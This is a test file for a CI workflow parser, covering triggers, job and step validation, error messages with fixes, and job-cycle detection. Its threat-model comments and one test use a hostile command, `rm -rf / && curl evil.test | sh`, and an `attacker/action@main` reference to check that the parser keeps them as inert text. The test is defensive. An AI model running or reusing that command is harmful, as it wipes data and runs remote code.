// Refusing a workflow before it can reach a runner.
//
// This is the one piece of CI that runs in the control plane, so the thing
// worth pinning is that it stays a *reader*: `run:` bodies are strings going in
// and strings coming out, and `uses:` is recorded rather than resolved. A
// validator that evaluated anything would be the bug the threat model exists to
// prevent, running on every fork's pull request.
//
// The rest is the error surface. A workflow file is usually written by somebody
// guessing at the schema, so an error without a line and a fix is the same as
// no error at all - and these assert the fix, not only the failure.

import { describe, expect, test } from 'bun:test'
import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { cyclicJobs, lineOf, parseWorkflow } from '../../app/Actions/Workflow/parse'

const VALID = `name: CI
on:
  push:
    branches: [main]
  pull_request: {}
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run the tests
        run: bun test
  lint:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: bun run lint
`

describe('a workflow that is fine', () => {
  test('parses into jobs and steps', () => {
    const result = parseWorkflow(VALID, 'ci.yml')

    expect(result.ok).toBe(true)
    expect(result.errors).toEqual([])
    expect(result.workflow?.name).toBe('CI')
    expect(result.workflow?.jobs.map(job => job.id)).toEqual(['test', 'lint'])
    expect(result.workflow?.jobs[1]?.needs).toEqual(['test'])
  })

  test('reads the triggers and their filters', () => {
    const { workflow } = parseWorkflow(VALID)

    expect(workflow?.triggers.push?.branches).toEqual(['main'])
    expect(workflow?.triggers.pullRequest).not.toBeNull()
    expect(workflow?.triggers.dispatch).toBe(false)
  })

  /*
   * The property the threat model depends on. A `run:` body is data here and
   * stays data: it is carried through verbatim, and `uses:` is a reference this
   * module records rather than goes and fetches.
   */
  test('carries commands through as text without evaluating them', () => {
    const { workflow } = parseWorkflow(`on: push
jobs:
  j:
    runs-on: x
    steps:
      - run: rm -rf / && curl evil.test | sh
      - uses: attacker/action@main
`)

    expect(workflow?.jobs[0]?.steps[0]?.run).toBe('rm -rf / && curl evil.test | sh')
    expect(workflow?.jobs[0]?.steps[1]?.uses).toBe('attacker/action@main')
  })

  test('accepts every shape of `on:` that Actions does', () => {
    expect(parseWorkflow(`on: push\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)
      .workflow?.triggers.push).not.toBeNull()

    expect(parseWorkflow(`on: [push, workflow_dispatch]\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)
      .workflow?.triggers.dispatch).toBe(true)

    expect(parseWorkflow(`on:\n  schedule:\n    - cron: '0 3 * * *'\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)
      .workflow?.triggers.schedule).toEqual(['0 3 * * *'])
  })
})

/*
 * The acceptance test for choosing this format at all: a copied
 * `.github/workflows` directory goes green with no edits. These are this
 * repository's own, which is a small corpus but a real one - and it is what
 * caught the first version rejecting `pull_request_target` and `workflow_call`
 * as unknown triggers. Both are valid Actions; one is a reusable workflow no
 * event starts, and the other is the most security-sensitive trigger there is.
 */
describe('against the workflows in this repository', () => {
  const directory = '.github/workflows'
  const files = readdirSync(directory).filter(name => /\.ya?ml$/.test(name))

  test('there are some to check', () => {
    expect(files.length).toBeGreaterThan(0)
  })

  for (const name of files) {
    test(`${name} parses`, () => {
      const result = parseWorkflow(readFileSync(join(directory, name), 'utf8'), name)

      if (!result.ok)
        console.log(`  ${name}:`, result.errors.map(error => `L${error.line} ${error.message}`))

      expect(result.ok).toBe(true)
      expect(result.workflow?.jobs.length).toBeGreaterThan(0)
    })
  }
})

describe('triggers that are valid but not ours to dispatch', () => {
  const of = (on: string) => parseWorkflow(`on:\n${on}\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)

  test('a reusable workflow is startable by another workflow, not by an event', () => {
    const result = of('  workflow_call:\n    inputs: {}')

    expect(result.ok).toBe(true)
    expect(result.workflow?.triggers.reusable).toBe(true)
    expect(result.workflow?.triggers.push).toBeNull()
  })

  /*
   * `pull_request_target` is kept apart from `pull_request` because it is the
   * same event with the opposite trust: the workflow comes from the base branch
   * and runs with the base repository's secrets against a fork's code. Folding
   * the two together would lose the one fact the fork policy needs.
   */
  test('pull_request_target is recorded as itself', () => {
    const result = of('  pull_request_target:')

    expect(result.workflow?.triggers.pullRequestTarget).not.toBeNull()
    expect(result.workflow?.triggers.pullRequest).toBeNull()
  })

  test('an event we do not run yet is recorded, not rejected', () => {
    const result = of('  release:\n    types: [published]')

    expect(result.ok).toBe(true)
    expect(result.workflow?.triggers.unsupported).toEqual(['release'])
  })

  test('but a misspelled event is still an error', () => {
    const result = of('  puhs:')

    expect(result.ok).toBe(false)
    expect(result.errors[0]?.message).toContain('Actions defines')
  })
})

describe('a workflow that is not', () => {
  const messages = (source: string) => parseWorkflow(source).errors.map(error => error.message)

  test('says so when nothing can start it', () => {
    const result = parseWorkflow(`jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)

    expect(result.ok).toBe(false)
    expect(result.errors[0]?.message).toContain('no `on:`')
    expect(result.errors[0]?.fix).toContain('on: push')
  })

  test('and when it has no jobs at all', () => {
    expect(messages('on: push\n').join()).toContain('no jobs')
  })

  test('catches a job with no runner and no steps', () => {
    const errors = parseWorkflow(`on: push\njobs:\n  j: {}\n`).errors

    expect(errors.some(error => error.message.includes('does not say what it runs on'))).toBe(true)
    expect(errors.some(error => error.message.includes('has no steps'))).toBe(true)
  })

  test('catches a step that does nothing, and one that does two things', () => {
    const errors = parseWorkflow(`on: push
jobs:
  j:
    runs-on: x
    steps:
      - name: nothing
      - run: a
        uses: b/c@v1
`).errors

    expect(errors.some(error => error.message.includes('does nothing'))).toBe(true)
    expect(errors.some(error => error.message.includes('both `run` and `uses`'))).toBe(true)
  })

  /*
   * The typo case, which is most of them in practice: `runs_on` and `runsOn`
   * are both things people write, and Actions accepts neither. Reporting it as
   * an unknown key *and* as a missing runner is right - the author has one
   * problem, and both sentences point at it.
   */
  test('names an unknown key rather than ignoring it', () => {
    const errors = parseWorkflow(`on: push
jobs:
  j:
    runs_on: ubuntu-latest
    steps:
      - run: a
`).errors

    expect(errors.some(error => error.message.includes('`runs_on` is not a job key'))).toBe(true)
    expect(errors.some(error => error.fix.includes('hyphenated'))).toBe(true)
  })

  test('and an unknown key at the top level', () => {
    const errors = parseWorkflow(`on: push\njosb:\n  j: {}\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`).errors

    expect(errors.some(error => error.message.includes('`josb` is not a workflow key'))).toBe(true)
  })

  test('reports a dependency on a job that does not exist, and lists the ones that do', () => {
    const errors = parseWorkflow(`on: push
jobs:
  build:
    runs-on: x
    needs: tset
    steps:
      - run: a
`).errors

    expect(errors[0]?.message).toContain('needs `tset`')
    expect(errors[0]?.fix).toContain('build')
  })

  test('refuses YAML that is not YAML, and blames the indentation', () => {
    const result = parseWorkflow('on: push\n\tjobs: broken\n', 'ci.yml')

    expect(result.ok).toBe(false)
    expect(result.errors[0]?.message).toContain('ci.yml is not valid YAML')
    expect(result.errors[0]?.fix).toContain('tab')
  })

  test('reports every problem at once rather than one per attempt', () => {
    const errors = parseWorkflow(`on: push
jobs:
  a:
    steps:
      - name: no command
  b:
    runs-on: x
`).errors

    // A missing runner, a step with nothing to do, and a job with no steps.
    expect(errors.length).toBeGreaterThanOrEqual(3)
  })
})

describe('jobs that wait on each other', () => {
  test('a two-job loop is named, both ways round', () => {
    const errors = parseWorkflow(`on: push
jobs:
  a:
    runs-on: x
    needs: b
    steps:
      - run: a
  b:
    runs-on: x
    needs: a
    steps:
      - run: b
`).errors

    const cycle = errors.find(error => error.message.includes('wait on each other'))
    expect(cycle).toBeDefined()
    expect(cycle?.message).toContain('a')
    expect(cycle?.message).toContain('b')
  })

  test('a job that needs itself is caught as itself, not as a cycle riddle', () => {
    const errors = parseWorkflow(`on: push
jobs:
  a:
    runs-on: x
    needs: a
    steps:
      - run: a
`).errors

    expect(errors.some(error => error.message.includes('needs itself'))).toBe(true)
  })

  test('a diamond is not a cycle', () => {
    const job = (id: string, needs: string[]) => ({
      id,
      name: null,
      runsOn: ['x'],
      needs,
      if: null,
      timeoutMinutes: null,
      env: {},
      steps: [],
    })

    expect(cyclicJobs([
      job('a', []),
      job('b', ['a']),
      job('c', ['a']),
      job('d', ['b', 'c']),
    ])).toEqual([])
  })

  test('and a three-job loop is', () => {
    const job = (id: string, needs: string[]) => ({
      id,
      name: null,
      runsOn: ['x'],
      needs,
      if: null,
      timeoutMinutes: null,
      env: {},
      steps: [],
    })

    expect(cyclicJobs([
      job('a', ['c']),
      job('b', ['a']),
      job('c', ['b']),
    ]).length).toBeGreaterThan(0)
  })
})

describe('lineOf', () => {
  const source = 'name: CI\non:\n  push: {}\njobs:\n  test:\n    runs-on: x\n'

  test('points at the line a key is on', () => {
    expect(lineOf(source, 'name')).toBe(1)
    expect(lineOf(source, 'jobs')).toBe(4)
    expect(lineOf(source, 'runs-on')).toBe(6)
  })

  test('can start looking part way down, which is how a job scopes its keys', () => {
    expect(lineOf(source, 'test', 4)).toBe(5)
  })

  test('answers zero rather than guessing when the key is not there', () => {
    expect(lineOf(source, 'nowhere')).toBe(0)
  })
})
